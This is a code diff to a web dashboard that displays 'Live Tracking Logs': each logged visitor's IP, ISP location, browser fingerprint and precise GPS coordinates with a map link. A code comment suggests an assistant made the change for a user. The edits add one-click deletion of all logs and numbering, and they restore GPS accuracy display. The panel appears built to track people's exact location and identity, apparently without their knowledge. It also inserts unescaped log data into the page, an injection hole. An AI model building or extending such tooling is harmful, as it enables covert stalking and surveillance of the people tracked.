@@ -113,7 +113,10 @@
     <div class="container">
         <h1>
             <span>🛰️ Live Tracking Logs</span>
-            <button onclick="fetchLogs()">Refresh</button>
+            <div>
+                <button onclick="clearLogs()" style="background-color: #da3633; margin-right: 10px;">🗑️ Clear</button>
+                <button onclick="fetchLogs()">Refresh</button>
+            </div>
         </h1>
         <div id="log-container" class="log-grid">
             Loading...
@@ -127,15 +130,15 @@
                 const res = await fetch('/api/logs');
                 const data = await res.json();
 
-                if (!data.success || !data.logs) {
-                    container.innerHTML = '<div>No logs found on server.</div>';
+                if (!data.success || !data.logs || data.logs.trim() === '') {
+                    container.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: #8b949e;">No logs found (Empty).</div>';
                     return;
                 }
 
                 // Parse the raw text log
                 const rawLogs = data.logs.split('-----------------------------').filter(l => l.trim().length > 0).reverse();
 
-                container.innerHTML = rawLogs.map(logBlock => {
+                container.innerHTML = rawLogs.map((logBlock, index) => {
                     const lines = logBlock.trim().split('\n');
                     let entry = { raw: logBlock };
 
@@ -151,7 +154,9 @@
                         if (line.startsWith('FINGERPRINT:')) entry.fingerprint = safeJSON(line.substring(12));
                     });
 
-                    return createCard(entry);
+                    // Log Number: Total - Index (so newest is #Total, oldest is #1) OR just 1..N based on display
+                    // User asked for "1 2 3", let's simply numbering them 1 (Top/Newest) to N.
+                    return createCard(entry, index + 1);
                 }).join('');
 
             } catch (e) {
@@ -159,17 +164,33 @@
             }
         }
 
+        async function clearLogs() {
+            if (!confirm('Are you sure you want to delete all logs?')) return;
+            try {
+                const res = await fetch('/api/logs/clear', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    fetchLogs(); // Reload
+                } else {
+                    alert('Failed: ' + data.error);
+                }
+            } catch (e) {
+                alert('Error: ' + e.message);
+            }
+        }
+
         function safeJSON(str) {
             try { return JSON.parse(str); } catch (e) { return str; }
         }
 
-        function createCard(entry) {
+        function createCard(entry, index) {
             let html = `<div class="card">`;
 
-            // Header
+            // Header with Number
             html += `<div class="card-header">
-                        <span>${entry.time || 'Unknown Time'}</span>
-                        <span style="color:white">${entry.ip || ''}</span>
+                        <span style="font-weight:bold; color:white;">#${index}</span>
+                        <span style="font-size:0.8em">${entry.time || 'Unknown Time'}</span>
+                        <span style="color:${entry.ip ? '#58a6ff' : '#666'}">${entry.ip || ''}</span>
                      </div>`;
 
             // Location (ISP)
@@ -185,14 +206,13 @@
 
             // GPS (Precise)
             if (entry.gps && typeof entry.gps === 'object') {
-                // Check if it's a valid GPS object with lat/lng
                 const lat = entry.gps.lat || entry.gps.latitude;
                 const lng = entry.gps.lng || entry.gps.longitude;
 
                 if (lat && lng) {
                     html += `<div class="section-title" style="color: #ff6b6b; border-color: #ff6b6b;">🎯 GPS (Precise)</div>`;
                     html += `<div class="data-row"><span class="label">Coords:</span> <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color:#ff6b6b; font-weight:bold;">${lat}, ${lng}</a></div>`;
-                    // html += `<div class="data-row"><span class="label">Accuracy:</span> ${entry.gps.accuracy || entry.gps.acc || 'N/A'} meters</div>`;
+                    html += `<div class="data-row"><span class="label">Accuracy:</span> ${entry.gps.accuracy || entry.gps.acc || 'N/A'} meters</div>`;
                 } else if (entry.gps.error) {
                     html += `<div class="section-title">🎯 GPS</div>`;
                     html += `<div class="data-row"><span class="label">Status:</span> <span style="color: #8b949e;">${entry.gps.error}</span></div>`;
